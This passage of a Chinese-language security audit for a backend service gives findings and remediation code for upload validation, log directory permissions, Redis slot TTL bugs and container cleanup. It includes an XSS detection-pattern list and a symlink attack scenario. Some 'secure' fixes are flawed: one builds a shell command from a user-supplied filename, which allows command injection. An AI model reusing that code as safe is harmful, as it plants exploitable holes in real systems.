  mimeType: string;
  magicBytes?: Buffer;  // 文件头魔法数字
  command?: string;      // 验证命令
}

const FILE_TYPES: Record<string, FileTypeDefinition> = {
  // Verilog文件
  '.v': {
    extension: '.v',
    mimeType: 'text/plain',
    // Verilog文件通常以特定关键字开头
    magicBytes: Buffer.from('module', 'utf-8')
  },

  // SystemVerilog
  '.sv': {
    extension: '.sv',
    mimeType: 'text/plain'
  },

  // VHDL
  '.vhd': {
    extension: '.vhd',
    mimeType: 'text/plain'
  },
  '.vhdl': {
    extension: '.vhdl',
    mimeType: 'text/plain'
  },

  // YAML
  '.yaml': {
    extension: '.yaml',
    mimeType: 'text/yaml'
  },
  '.yml': {
    extension: '.yml',
    mimeType: 'text/yaml'
  },

  // TCL
  '.tcl': {
    extension: '.tcl',
    mimeType: 'text/plain'
  },

  // Excel
  '.xlsx': {
    extension: '.xlsx',
    mimeType: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
    magicBytes: Buffer.from('504b0304', 'hex')  // ZIP文件头
  },
  '.xls': {
    extension: '.xls',
    mimeType: 'application/vnd.ms-excel',
    magicBytes: Buffer.from('d0cf11e0', 'hex')  // OLE文件头
  }
};

/**
 * 文件内容验证器
 */
export class FileContentValidator {
  /**
   * 验证文件内容
   */
  static async validate(filePath: string, originalName: string): Promise<{
    valid: boolean;
    error?: string;
    detectedType?: string;
  }> {
    try {
      const ext = path.extname(originalName).toLowerCase();
      const fileType = FILE_TYPES[ext];

      if (!fileType) {
        return {
          valid: false,
          error: `Unsupported file extension: ${ext}`
        };
      }

      // 1. 检查魔法数字（二进制文件）
      if (fileType.magicBytes) {
        const buffer = await fs.readFile(filePath);
        const fileHeader = buffer.subarray(0, fileType.magicBytes.length);

        if (!fileHeader.equals(fileType.magicBytes)) {
          return {
            valid: false,
            error: `File content does not match ${ext} format`
          };
        }
      }

      // 2. 对文本文件进行内容检查
      if (['.v', '.sv', '.vhd', '.vhdl', '.yaml', '.yml', '.tcl'].includes(ext)) {
        const content = await fs.readFile(filePath, 'utf-8');
        const contentCheck = this.validateTextContent(content, ext);

        if (!contentCheck.valid) {
          return contentCheck;
        }
      }

      // 3. 对Excel文件使用file命令验证
      if (['.xlsx', '.xls'].includes(ext)) {
        try {
          const { stdout } = await execAsync(`file --mime-type "${filePath}"`);

          if (!stdout.includes(fileType.mimeType)) {
            return {
              valid: false,
              error: `File type mismatch. Expected: ${fileType.mimeType}, Detected: ${stdout.trim()}`
            };
          }
        } catch (error) {
          logger.warn({ error, filePath }, 'file command failed, skipping validation');
        }
      }

      return { valid: true, detectedType: fileType.mimeType };

    } catch (error) {
      logger.error({ error, filePath }, 'File content validation error');

      return {
        valid: false,
        error: 'Validation failed'
      };
    }
  }

  /**
   * 验证文本文件内容
   */
  private static validateTextContent(
    content: string,
    ext: string
  ): { valid: boolean; error?: string } {
    // 检查是否包含危险字符
    const dangerousPatterns = [
      /<script/i,           // XSS
      /<iframe/i,           // iframe
      /javascript:/i,       // javascript: URL
      /on\w+\s*=/i,         // 事件处理器
      /\x00/,               // 空字节
      /\x1b/,               // ESC字符
    ];

    for (const pattern of dangerousPatterns) {
      if (pattern.test(content)) {
        return {
          valid: false,
          error: 'File contains dangerous content'
        };
      }
    }

    // 根据文件类型进行特定验证
    switch (ext) {
      case '.v':
      case '.sv':
        // Verilog/SystemVerilog应该包含module或program关键字
        if (!/\b(module|program|interface|package)\b/.test(content)) {
          return {
            valid: false,
            error: 'File does not appear to be valid Verilog/SystemVerilog'
          };
        }
        break;

      case '.yaml':
      case '.yml':
        // YAML不应该包含明显的语法错误
        if (content.includes('\t')) {
          return {
            valid: false,
            error: 'YAML files should not contain tabs'
          };
        }
        break;

      case '.tcl':
        // TCL应该包含有效命令
        if (!/^(set|proc|namespace|package|if|for|foreach|while)/m.test(content)) {
          // 不强制要求，只是警告
        }
        break;
    }

    return { valid: true };
  }

  /**
   * 检查文件大小
   */
  static async checkFileSize(filePath: string, maxSize: number): Promise<boolean> {
    try {
      const stats = await fs.stat(filePath);
      return stats.size <= maxSize;
    } catch {
      return false;
    }
  }

  /**
   * 扫描病毒（可选，需要安装clamav）
   */
  static async scanForVirus(filePath: string): Promise<boolean> {
    try {
      const { stdout } = await execAsync(`clamscan --no-summary "${filePath}"`);

      if (stdout.includes('FOUND')) {
        logger.error({ filePath, scanResult: stdout }, 'Virus detected in uploaded file');
        return false;
      }

      return true;
    } catch (error) {
      // clamscan不可用时不阻止上传
      logger.debug({ error }, 'ClamAV not available, skipping virus scan');
      return true;
    }
  }
}

// ===== 在路由中使用 =====
// app/backend/src/routes/task.routes.ts

import { FileContentValidator } from '../utils/file-content-validator';

const upload = multer({
  storage: multer.memoryStorage(),
  limits: {
    fileSize: 100 * 1024 * 1024, // 100MB
    files: 10,
  },
  fileFilter: async (req, file, cb) => {
    const allowedTypes = ['.v', '.sv', '.vhd', '.vhdl', '.yaml', '.yml', '.tcl', '.xlsx', '.xls'];
    const ext = path.extname(file.originalname).toLowerCase();

    if (!allowedTypes.includes(ext)) {
      return cb(new Error(`Invalid file type: ${ext}. Allowed: ${allowedTypes.join(', ')}`));
    }

    // ✅ 将文件保存到临时位置进行内容验证
    const tempDir = '/tmp/logiccore-upload-validate';
    await fs.mkdir(tempDir, { recursive: true });

    const tempPath = path.join(tempDir, `${Date.now()}-${file.originalname}`);

    try {
      // 写入临时文件
      await fs.writeFile(tempPath, file.buffer);

      // ✅ 验证文件内容
      const validation = await FileContentValidator.validate(tempPath, file.originalname);

      if (!validation.valid) {
        // 删除临时文件
        await fs.unlink(tempPath).catch(() => {});

        return cb(new Error(`File validation failed: ${validation.error}`));
      }

      // ✅ 病毒扫描（可选）
      const isClean = await FileContentValidator.scanForVirus(tempPath);
      if (!isClean) {
        await fs.unlink(tempPath).catch(() => {});
        return cb(new Error('Security threat detected in file'));
      }

      // 将验证后的内容放回buffer（后续multer会处理）
      file.buffer = await fs.readFile(tempPath);

      // 删除临时文件
      await fs.unlink(tempPath).catch(() => {});

      cb(null, true);

    } catch (error) {
      // 清理临时文件
      await fs.unlink(tempPath).catch(() => {});

      logger.error({ error, fileName: file.originalname }, 'File validation error');

      return cb(new Error('File validation failed'));
    }
  }
});
```

---

### 1.7 日志目录权限过于宽松

**风险等级**: 🔴 P0 - 严重

**影响范围**: SDC多页面工具日志，可能导致权限提升

**代码位置**: `app/backend/src/controllers/sdc_thrpages.controller.ts:99`

**问题描述**:

#### 1.7.1 日志目录使用777权限

**当前代码** (`sdc_thrpages.controller.ts:99`):
```typescript
await fsPromises.mkdir(logsDir, { recursive: true, mode: 0o777 });  // ❌ 世界可写！
```

**问题分析**:
- `mode: 0o777` 表示所有用户都可读、写、执行
- 任何系统用户都可以修改、删除日志文件
- 可能的攻击：攻击者创建符号链接，覆盖系统文件

**攻击场景**:
1. 攻击者在系统上创建恶意符号链接
2. 链接到系统敏感文件（如`/etc/passwd`）
3. 应用写入日志时覆盖敏感文件
4. 或攻击者读取其他用户的日志获取敏感信息

**解决方案**:

```typescript
// ===== 安全的目录创建 =====
// app/backend/src/utils/secure-directory.ts

import fs from 'fs/promises';
import path from 'path';
import logger from '../config/logger';

/**
 * 安全的目录权限
 */
const SECURE_DIR_MODE = 0o750;  // rwxr-x---: 所有者完全控制，组可读执行，其他无权限
const SECURE_FILE_MODE = 0o640; // rw-r-----: 所有者读写，组只读，其他无权限

/**
 * 创建安全目录
 */
export async function createSecureDirectory(
  dirPath: string,
  mode: number = SECURE_DIR_MODE
): Promise<void> {
  try {
    // 1. 解析路径，确保是绝对路径
    const resolvedPath = path.resolve(dirPath);

    // 2. 检查父目录权限
    const parentDir = path.dirname(resolvedPath);

    try {
      const parentStats = await fs.stat(parentDir);

      // 确保父目录不是世界可写的
      const parentMode = parentStats.mode;
      const isWorldWritable = (parentMode & 0o002) !== 0;

      if (isWorldWritable && parentStats.uid !== process.getuid()) {
        throw new Error(
          `Parent directory ${parentDir} is world writable and not owned by current user`
        );
      }
    } catch (error) {
      logger.warn({ error, parentDir }, 'Failed to check parent directory permissions');
    }

    // 3. 创建目录
    await fs.mkdir(resolvedPath, {
      recursive: true,
      mode: mode
    });

    // 4. 验证创建后的权限（umask可能影响实际权限）
    const stats = await fs.stat(resolvedPath);

    // 检查是否设置了正确的权限
    const actualMode = stats.mode & 0o777;

    if ((actualMode & 0o002) !== 0) {
      // 目录仍然是世界可写的，尝试修复
      logger.warn({
        path: resolvedPath,
        actualMode: actualMode.toString(8)
      }, 'Directory is still world writable, attempting to fix');

      await fs.chmod(resolvedPath, mode);
    }

    // 5. 检查符号链接攻击
    if (stats.isSymbolicLink()) {
      throw new Error(`Security: Directory ${resolvedPath} is a symbolic link`);
    }

    logger.debug({
      path: resolvedPath,
      mode: mode.toString(8),
      actualMode: actualMode.toString(8)
    }, 'Secure directory created');

  } catch (error) {
    logger.error({
      error: error instanceof Error ? error.message : String(error),
      path: dirPath
    }, 'Failed to create secure directory');

    throw error;
  }
}

/**
 * 安全的文件写入
 */
export async function writeSecureFile(
  filePath: string,
  content: string | Buffer,
  mode: number = SECURE_FILE_MODE
): Promise<void> {
  try {
    const resolvedPath = path.resolve(filePath);

    // 1. 确保目录存在且权限正确
    await createSecureDirectory(path.dirname(resolvedPath));

    // 2. 原子写入（先写临时文件，再重命名）
    const tempPath = `${resolvedPath}.tmp.${Date.now()}.${process.pid}`;

    await fs.writeFile(tempPath, content, { mode });

    // 3. 原子重命名
    await fs.rename(tempPath, resolvedPath);

    logger.debug({ path: resolvedPath }, 'Secure file written');

  } catch (error) {
    // 清理临时文件
    try {
      const tempPath = `${filePath}.tmp.${Date.now()}.${process.pid}`;
      await fs.unlink(tempPath);
    } catch {}

    logger.error({
      error: error instanceof Error ? error.message : String(error),
      path: filePath
    }, 'Failed to write secure file');

    throw error;
  }
}

/**
 * 验证路径安全性
 */
export async function validatePathSecurity(
  targetPath: string,
  basePath: string
): Promise<boolean> {
  try {
    const resolvedTarget = path.resolve(targetPath);
    const resolvedBase = path.resolve(basePath);

    // 确保目标路径在基础路径内
    if (!resolvedTarget.startsWith(resolvedBase)) {
      logger.error({
        targetPath,
        basePath,
        resolvedTarget,
        resolvedBase
      }, 'Path traversal attempt detected');

      return false;
    }

    // 检查符号链接
    const stats = await fs.stat(resolvedTarget);

    if (stats.isSymbolicLink()) {
      const linkTarget = await fs.readlink(resolvedTarget);
      const resolvedLink = path.resolve(path.dirname(resolvedTarget), linkTarget);

      // 确保符号链接目标也在基础路径内
      if (!resolvedLink.startsWith(resolvedBase)) {
        logger.error({
          targetPath,
          linkTarget,
          resolvedLink,
          basePath
        }, 'Symbolic link points outside base directory');

        return false;
      }
    }

    return true;

  } catch (error) {
    logger.error({
      error: error instanceof Error ? error.message : String(error),
      targetPath,
      basePath
    }, 'Path security validation failed');

    return false;
  }
}

// ===== 使用示例 =====
// app/backend/src/controllers/sdc_thrpages.controller.ts

import { createSecureDirectory, writeSecureFile, validatePathSecurity } from '../utils/secure-directory';

export async function initializeSDCTool(req: Request, res: Response) {
  try {
    const { taskId } = req.body;
    const userId = req.user!.id;

    // 基础日志目录
    const baseLogsDir = process.env.TASK_LOGS_DIR || '/opt/logiccore/logs';

    // ✅ 验证路径安全性
    const taskLogsDir = path.join(baseLogsDir, taskId);

    const isSecure = await validatePathSecurity(taskLogsDir, baseLogsDir);

    if (!isSecure) {
      return res.status(403).json({ message: 'Path validation failed' });
    }

    // ✅ 创建安全目录
    await createSecureDirectory(taskLogsDir, 0o750);

    // ✅ 安全写入日志文件
    const logFilePath = path.join(taskLogsDir, 'tool.log');

    await writeSecureFile(logFilePath, `SDC Tool initialized for task ${taskId}\n`, 0o640);

    res.json({
      message: 'SDC tool initialized',
      logsDir: taskLogsDir
    });

  } catch (error) {
    logger.error({ error }, 'Failed to initialize SDC tool');
    res.status(500).json({ message: 'Initialization failed' });
  }
}
```

---

## 2. 高优先级问题 (P1)

### 2.1 并发控制存在竞态条件和槽位泄漏风险

**风险等级**: 🟠 P1 - 高

**影响范围**: 用户并发限制，可能导致用户无法提交任务

**代码位置**:
- `app/backend/src/services/user-concurrent-check.service.ts`
- `app/backend/src/middleware/subscription.ts:60-78`

**问题描述**:

#### 2.1.1 异常情况下槽位可能未释放

**当前代码** (`subscription.ts:161-169`):
```typescript
} catch (error) {
  // 发生异常时释放已预留的槽位
  try {
    await userConcurrentCheck.releaseConcurrentSlot(userId);
  } catch (releaseError) {
    logger.error({
      error: releaseError instanceof Error ? releaseError.message : 'Unknown error',
      userId
    }, 'Failed to release concurrent slot during error handling');
  }
  // ...
}
```

**问题分析**:
- 虽然实现了异常时的槽位释放，但如果`releaseConcurrentSlot`本身失败，槽位会永久占用
- Redis网络故障、服务重启等情况可能导致槽位泄漏
- 没有定期检查和自动修复槽位泄漏的机制

**影响场景**:
1. 用户提交任务时预留槽位
2. 任务创建失败（数据库连接失败、Redis故障等）
3. 槽位释放操作也失败（Redis仍不可用）
4. 用户槽位被永久占用，无法提交新任务

#### 2.1.2 槽位TTL计算可能不准确

**当前代码** (`user-concurrent-check.service.ts:28-49`):
```typescript
private getSlotExpireSeconds(): number {
  const queueWaitTimeoutMinutes = parseInt(process.env.QUEUE_WAIT_TIMEOUT_MINUTES || '35');
  const containerStartupTimeoutSeconds = 180;
  const executionTimeoutMinutes = parseInt(process.env.CONTAINER_EXECUTION_TIMEOUT_MINUTES || '3');
  const bufferSeconds = 300;

  const queueWaitSeconds = queueWaitTimeoutMinutes * 60;
  const executionTimeoutSeconds = executionTimeoutMinutes * 60 * 60;  // ❌ 这里应该是分钟不是小时！

  const totalTTL = queueWaitSeconds + containerStartupTimeoutSeconds + executionTimeoutSeconds + bufferSeconds;
  return totalTTL;
}
```

**问题分析**:
- `executionTimeoutMinutes * 60 * 60` 实际上计算的是**小时**，不是分钟
- 如果`CONTAINER_EXECUTION_TIMEOUT_MINUTES=3`，则`executionTimeoutSeconds = 3 * 60 * 60 = 10800`秒（3小时）
- 这导致TTL计算过大或过小

**解决方案**:

```typescript
// ===== 1. 修复TTL计算错误 =====
// app/backend/src/services/user-concurrent-check.service.ts

private getSlotExpireSeconds(): number {
  const queueWaitTimeoutMinutes = parseInt(process.env.QUEUE_WAIT_TIMEOUT_MINUTES || '35');
  const containerStartupTimeoutSeconds = 180;
  const executionTimeoutMinutes = parseInt(process.env.CONTAINER_EXECUTION_TIMEOUT_MINUTES || '3');
  const bufferSeconds = 300;

  // ✅ 修复：分钟转换为秒
  const queueWaitSeconds = queueWaitTimeoutMinutes * 60;
  const executionTimeoutSeconds = executionTimeoutMinutes * 60;  // ✅ 正确转换

  const totalTTL = queueWaitSeconds + containerStartupTimeoutSeconds + executionTimeoutSeconds + bufferSeconds;

  logger.debug({
    queueWaitMinutes: queueWaitTimeoutMinutes,
    executionTimeoutMinutes: executionTimeoutMinutes,
    totalTTLSeconds: totalTTL,
    totalTTLMinutes: Math.floor(totalTTL / 60)
  }, 'Calculated dynamic slot TTL');

  return totalTTL;
}

// ===== 2. 增加槽位健康检查和自动修复 =====
export class UserConcurrentCheckService {
  // ... 原有代码 ...

  /**
   * 检查并修复槽位健康状态
   * 返回是否需要修复
   */
  async checkSlotHealth(userId: string): Promise<{
    isHealthy: boolean;
    redisCount: number;
    dbCount: number;
    fixed: boolean;
  }> {
    try {
      const redis = redisPool.getClient();
      const userKey = `${this.USER_CONCURRENT_PREFIX}${userId}`;

      // 获取Redis中的计数
      const redisCountStr = await redis.hget(userKey, 'count');
      const redisCount = redisCountStr ? parseInt(redisCountStr, 10) : 0;

      // 从数据库获取实际活跃任务数
      const dbCount = await prisma.task.count({
        where: {
          userId,
          status: { in: ['PENDING', 'RUNNING'] }
        }
      });

      const isHealthy = redisCount === dbCount;
      let fixed = false;

      if (!isHealthy) {
        logger.warn({
          userId,
          redisCount,
          dbCount,
          difference: Math.abs(redisCount - dbCount)
        }, 'Slot count inconsistency detected, auto-fixing');

        // 修复：以数据库为准
        await redis.hset(userKey, 'count', dbCount.toString());
        await redis.hset(userKey, 'last_fixed', Date.now().toString());
        await redis.expire(userKey, this.getSlotExpireSeconds());

        fixed = true;
      }

      return { isHealthy, redisCount, dbCount, fixed };
    } catch (error) {
      logger.error({
        error: error instanceof Error ? error.message : 'Unknown error',
        userId
      }, 'Failed to check slot health');
      throw error;
    }
  }

  /**
   * 批量检查所有用户的槽位健康状态
   */
  async checkAllSlotsHealth(): Promise<{
    totalChecked: number;
    unhealthyCount: number;
    fixedCount: number;
  }> {
    try {
      const redis = redisPool.getClient();
      const pattern = `${this.USER_CONCURRENT_PREFIX}*`;
      const keys = await redis.keys(pattern);

      let unhealthyCount = 0;
      let fixedCount = 0;

      for (const key of keys) {
        const userId = key.replace(this.USER_CONCURRENT_PREFIX, '');
        const result = await this.checkSlotHealth(userId);

        if (!result.isHealthy) {
          unhealthyCount++;
        }
        if (result.fixed) {
          fixedCount++;
        }
      }

      logger.info({
        totalChecked: keys.length,
        unhealthyCount,
        fixedCount
      }, 'Slot health check completed');

      return {
        totalChecked: keys.length,
        unhealthyCount,
        fixedCount
      };
    } catch (error) {
      logger.error({
        error: error instanceof Error ? error.message : 'Unknown error'
      }, 'Failed to check all slots health');
      throw error;
    }
  }
}

// ===== 3. 增加定期槽位健康检查任务 =====
// app/backend/src/jobs/slot-health-check.job.ts

import cron from 'node-cron';
import { userConcurrentCheck } from '../services/user-concurrent-check.service';
import logger from '../config/logger';

export class SlotHealthCheckJob {
  private static task: cron.ScheduledTask | null = null;

  static start() {
    if (this.task) {
      logger.warn('Slot health check job already running');
      return;
    }

    // 每5分钟执行一次
    this.task = cron.schedule('*/5 * * * *', async () => {
      try {
        logger.info('Starting slot health check...');

        const result = await userConcurrentCheck.checkAllSlotsHealth();

        if (result.unhealthyCount > 0) {
          logger.warn({
            unhealthy: result.unhealthyCount,
            fixed: result.fixedCount
          }, 'Fixed unhealthy slots');
        }
      } catch (error) {
        logger.error({
          error: error instanceof Error ? error.message : 'Unknown error'
        }, 'Slot health check job failed');
      }
    });

    logger.info('Slot health check job started (interval: 5 minutes)');
  }

  static stop() {
    if (this.task) {
      this.task.stop();
      this.task = null;
      logger.info('Slot health check job stopped');
    }
  }
}

// 在app启动时启动任务
// app/backend/src/index.ts
import { SlotHealthCheckJob } from './jobs/slot-health-check.job';

async function startServer() {
  // ... 原有启动逻辑 ...

  // 启动槽位健康检查任务
  SlotHealthCheckJob.start();

  logger.info('Server started successfully');
}

// ===== 4. 任务状态更新时刷新槽位TTL =====
// app/backend/src/services/task-state-manager.service.ts

export class TaskStateManagerService {
  // ... 原有代码 ...

  async updateTaskStatus(
    taskId: string,
    status: TaskStatus,
    additionalData?: Record<string, any>
  ): Promise<void> {
    // ... 原有状态更新逻辑 ...

    // ✅ 刷新用户槽位TTL，防止槽位过早过期
    if (status === 'RUNNING' || status === 'PENDING') {
      try {
        const task = await prisma.task.findUnique({
          where: { id: taskId },
          select: { userId: true }
        });

        if (task) {
          await userConcurrentCheck.refreshSlotTTL(task.userId);
          logger.debug({
            taskId,
            userId: task.userId,
            status
          }, 'Refreshed slot TTL on status update');
        }
      } catch (error) {
        logger.error({
          error: error instanceof Error ? error.message : 'Unknown error',
          taskId
        }, 'Failed to refresh slot TTL');
      }
    }
  }
}
```

---

### 2.2 容器资源管理存在泄漏风险

**风险等级**: 🟠 P1 - 高

**影响范围**: Docker容器资源，可能导致资源耗尽

**代码位置**: `app/backend/src/workers/container_manager.py`

**问题描述**:

#### 2.2.1 容器清理失败无重试机制

**当前代码** (`container_manager.py:64-115`):
```python
def cleanup_container(self, task_id: str, force: bool = False, reason: str = "unknown") -> bool:
    # ... 清理逻辑 ...

    except Exception as e:
        logger.warning(f"Failed to cleanup container {container_name}: {e}")
        # ❌ 只是记录日志，不重试

    return success  # 可能返回False但不会重试
```

**问题分析**:
- 容器清理失败只记录日志，不会自动重试
- Docker daemon暂时不可用时，清理会失败
- 失败的容器会继续占用系统资源

#### 2.2.2 Worker崩溃时容器成为孤儿容器

**问题分析**:
- Worker进程崩溃时，正在运行的容器不会被自动清理
- 需要手动清理孤儿容器
- 大量孤儿容器可能导致系统资源耗尽

**解决方案**:

```python
# ===== 1. 增加容器清理重试机制 =====
# app/backend/src/workers/container_manager.py

import time
from typing import Callable
from functools import wraps
import logging

logger = logging.getLogger(__name__)

def retry_on_failure(max_retries: int = 3, base_delay: float = 1.0):
    """
    重试装饰器
    :param max_retries: 最大重试次数
    :param base_delay: 基础延迟时间（秒），使用指数退避
    """
    def decorator(func: Callable) -> Callable:
        @wraps(func)
        def wrapper(*args, **kwargs):
            last_error = None

            for attempt in range(max_retries):
                try:
                    return func(*args, **kwargs)
                except Exception as e:
                    last_error = e

                    if attempt < max_retries - 1:
                        delay = base_delay * (2 ** attempt)  # 指数退避
                        logger.warning(
                            f"Attempt {attempt + 1}/{max_retries} failed for {func.__name__}: {e}. "
                            f"Retrying in {delay}s..."
                        )
                        time.sleep(delay)
                    else:
                        logger.error(
                            f"All {max_retries} attempts failed for {func.__name__}"
                        )

            raise last_error

        return wrapper
    return decorator


class ContainerManager:
    """容器管理器 - 增强版"""

    def __init__(self):
        try:
            self.docker_client = docker.from_env()
            self.active_containers: Dict[str, Dict[str, Any]] = {}
            logger.info("Container manager initialized successfully")
        except Exception as e:
            logger.error(f"Failed to initialize Docker client: {e}")
            self.docker_client = None

        # ✅ 注册退出处理器
        self._register_exit_handlers()

    def _register_exit_handlers(self):
        """注册退出时的清理处理器"""
        import atexit
        import signal
        import sys

        # atexit处理器（正常退出时调用）
        atexit.register(self._cleanup_on_exit)

        # 信号处理器（异常终止时调用）
        signal.signal(signal.SIGTERM, self._signal_handler)
        signal.signal(signal.SIGINT, self._signal_handler)

    def _cleanup_on_exit(self):
        """程序退出时的清理"""
        logger.info("Cleaning up containers on exit...")
        cleaned = self.cleanup_all_task_containers(reason="process_exit")
        logger.info(f"Cleaned up {cleaned} containers on exit")

    def _signal_handler(self, signum, frame):
        """信号处理器"""
        logger.info(f"Received signal {signum}, cleaning up containers...")
        self.cleanup_all_task_containers(reason=f"signal_{signum}")
        sys.exit(0)

    @retry_on_failure(max_retries=3, base_delay=1.0)
    def cleanup_container(self, task_id: str, force: bool = False, reason: str = "unknown") -> bool:
        """
        清理指定任务的容器（带重试机制）

        :param task_id: 任务ID
        :param force: 是否强制删除
        :param reason: 清理原因
        :return: 是否成功
        """
        container_info = self.active_containers.get(task_id)
        success = False

        if container_info:
            container = container_info['container']
            container_name = container_info['name']

            try:
                # 停止容器
                container.stop(timeout=10)
                logger.info(f"Container stopped: {container_name}")
            except Exception as e:
                logger.warning(f"Failed to stop container {container_name}: {e}")

            try:
                # 删除容器
                container.remove(force=force)
                logger.info(f"Container removed: {container_name}")
                success = True
            except Exception as e:
                logger.warning(f"Failed to remove container {container_name}: {e}")
                raise  # 抛出异常以触发重试

            # 从跟踪列表移除
            del self.active_containers[task_id]

        # 尝试通过名称清理（备用方案）
        container_name = f"tool-job-{task_id}"
        try:
            container = self.docker_client.containers.get(container_name)
            container.stop(timeout=10)
            container.remove(force=force)
            logger.info(f"Container cleaned up by name: {container_name}")
            success = True
        except docker.errors.NotFound:
            logger.debug(f"Container {container_name} not found, already cleaned")
            success = True  # 容器不存在也算成功
        except Exception as e:
            logger.warning(f"Failed to cleanup container {container_name}: {e}")
            raise  # 抛出异常以触发重试

        if success:
            logger.info(f"Container cleanup successful for task {task_id}, reason: {reason}")
        else:
            logger.error(f"Container cleanup failed for task {task_id}, reason: {reason}")

        return success

    def cleanup_all_task_containers(self, reason: str = "system_shutdown") -> int:
        """
        清理所有任务容器（系统关闭时调用）

        :param reason: 清理原因
        :return: 清理成功的容器数量
        """
        cleaned_count = 0
        task_ids = list(self.active_containers.keys())

        logger.info(f"Starting cleanup of {len(task_ids)} containers, reason: {reason}")

        for task_id in task_ids:
            try:
                if self.cleanup_container(task_id, force=True, reason=reason):
                    cleaned_count += 1
            except Exception as e:
                logger.error(f"Failed to cleanup container for task {task_id}: {e}")

        logger.info(f"Cleaned up {cleaned_count}/{len(task_ids)} containers, reason: {reason}")
        return cleaned_count

    def cleanup_orphaned_containers(self) -> int:
        """
        清理孤立的工具容器（没有在跟踪列表中的）

        :return: 清理的容器数量
        """
        try:
            cleaned_count = 0
            containers = self.docker_client.containers.list(all=True)

            for container in containers:
                if container.name and container.name.startswith('tool-job-'):
                    # 提取task_id
                    task_id = container.name.replace('tool-job-', '')

                    # 如果不在跟踪列表中，则为孤立容器
                    if task_id not in self.active_containers:
                        try:
                            container.stop(timeout=10)
                            container.remove(force=True)
                            logger.info(f"Cleaned up orphaned container: {container.name}")
                            cleaned_count += 1
                        except Exception as e:
                            logger.warning(f"Failed to cleanup orphaned container {container.name}: {e}")

            if cleaned_count > 0:
                logger.info(f"Cleaned up {cleaned_count} orphaned containers")

            return cleaned_count

        except Exception as e:
            logger.error(f"Error cleaning up orphaned containers: {e}")
            return 0

    def start_orphan_cleanup_task(self, interval_seconds: int = 300):
        """
        启动定期清理孤儿容器的后台任务

        :param interval_seconds: 清理间隔（秒），默认5分钟
        """
        import threading

        def cleanup_task():
            while True:
                try:
                    self.cleanup_orphaned_containers()
                except Exception as e:
                    logger.error(f"Orphan cleanup task error: {e}")
                time.sleep(interval_seconds)

        cleanup_thread = threading.Thread(target=cleanup_task, daemon=True)
        cleanup_thread.start()
        logger.info(f"Orphan container cleanup task started (interval: {interval_seconds}s)")

        return cleanup_thread

# ===== 2. 在Worker启动时启动孤儿容器清理任务 =====
# app/backend/src/workers/toolWorker.py

def main():
    # ... 原有初始化代码 ...

    # ✅ 启动孤儿容器清理任务
    container_manager.start_orphan_cleanup_task(interval_seconds=300)

    logger.info("Worker started successfully")

    # ... 原有Worker主循环 ...
```

---

### 2.3 数据库查询存在N+1问题

**风险等级**: 🟠 P1 - 高

**影响范围**: 高并发场景下的数据库性能

**问题描述**:

多处存在N+1查询问题，特别是在获取任务列表和用户订阅信息时。

**解决方案**:

```typescript
// ❌ 不好的做法 - N+1查询
export async function getUserTasks(userId: string) {
  const tasks = await prisma.task.findMany({
    where: { userId }
  });

  // N+1查询：对每个任务都查询一次
  for (const task of tasks) {
    const tool = await prisma.tool.findUnique({
      where: { id: task.toolId }
    });
    task.tool = tool;
  }

  return tasks;
}

// ✅ 好的做法 - 使用include一次查询
export async function getUserTasks(userId: string) {
  const tasks = await prisma.task.findMany({
    where: { userId },
    include: {
      tool: {
        select: {
          id: true,
          name: true,
          description: true,
          version: true
        }
      },
      user: {
        select: {
          id: true,
          email: true,
          name: true
        }
      }
    },
    orderBy: {
      createdAt: 'desc'
    }
  });

  return tasks;
}

// ✅ 更好的做法 - 分页 + 只选择需要的字段
export async function getUserTasksPaginated(
  userId: string,
  page: number = 1,
  limit: number = 20
) {
  const skip = (page - 1) * limit;

  const [tasks, total] = await prisma.$transaction([
    prisma.task.findMany({
      where: { userId },
      select: {
        id: true,
        status: true,
        createdAt: true,
        updatedAt: true,
        progress: true,
        currentStep: true,
        tool: {
          select: {
            id: true,
            name: true,
            toolType: true
          }
        }
      },
      orderBy: {
        createdAt: 'desc'
      },
      skip,
      take: limit
    }),
    prisma.task.count({
      where: { userId }
    })
  ]);

  return {
    data: tasks,
    pagination: {
      page,
      limit,
      total,
      totalPages: Math.ceil(total / limit)
    }
  };
}
```

---

### 2.4 Redis单连接模式可能导致瓶颈

**风险等级**: 🟠 P1 - 高

**影响范围**: 高并发场景

**代码位置**: `app/backend/src/services/redis-pool.service.ts`

**问题描述**:

当前使用单例模式，整个应用共享一个Redis连接。在高并发场景下可能出现命令阻塞。

**解决方案**:

```typescript
// ===== 实现Redis连接池 =====
// app/backend/src/services/redis-pool.service.ts

import Redis from 'ioredis';
import logger from '../config/logger';

export class RedisPoolService {
  private static instance: RedisPoolService;
  private connections: Redis[] = [];
  private currentIndex = 0;
  private readonly POOL_SIZE = parseInt(process.env.REDIS_POOL_SIZE || '10');

  private constructor() {
    for (let i = 0; i < this.POOL_SIZE; i++) {
      const redis = this.createRedisConnection();
      this.connections.push(redis);
    }

    logger.info({
      poolSize: this.POOL_SIZE
    }, 'Redis connection pool initialized');
  }

  private createRedisConnection(): Redis {
    return new Redis({
      host: process.env.REDIS_HOST || 'localhost',
      port: parseInt(process.env.REDIS_PORT || '6379'),
      password: process.env.REDIS_PASSWORD,
      db: parseInt(process.env.REDIS_DB || '0'),

      // 连接超时配置
      connectTimeout: 10000,

      // 连接池配置
      maxRetriesPerRequest: 3,
      retryDelayOnFailover: 100,
      enableReadyCheck: true,

      // 离线队列配置
      enableOfflineQueue: false,  // 高并发场景关闭离线队列

      // 连接保活
      keepAlive: 30000,

      // 重试策略
      retryStrategy: (times: number) => {
        if (times > 3) return null;
        return Math.min(times * 100, 2000);
      },

      // 事件监听
      // ...
    });
  }

  public static getInstance(): RedisPoolService {
    if (!RedisPoolService.instance) {
      RedisPoolService.instance = new RedisPoolService();
    }
    return RedisPoolService.instance;
  }

  /**
   * 获取Redis客户端（轮询策略）
   */
  public getClient(): Redis {
    const client = this.connections[this.currentIndex];
    this.currentIndex = (this.currentIndex + 1) % this.connections.length;
    return client;
  }

  /**
   * 批量操作使用pipeline
   */
  public async pipeline(commands: Array<{
    key: string;
    command: string;
    args: any[]
  }>) {
    const client = this.getClient();
    const pipeline = client.pipeline();

    for (const { key, command, args } of commands) {
      pipeline[command](key, ...args);
    }

    return await pipeline.exec();
  }

  /**
   * 获取池状态
   */
  public getPoolStatus() {
    return {
      poolSize: this.POOL_SIZE,
      activeConnections: this.connections.length,
      currentIndex: this.currentIndex
    };
  }
}

export const redisPool = RedisPoolService.getInstance();
```

---

### 2.5 任务超时监控机制不够健壮

**风险等级**: 🟠 P1 - 高

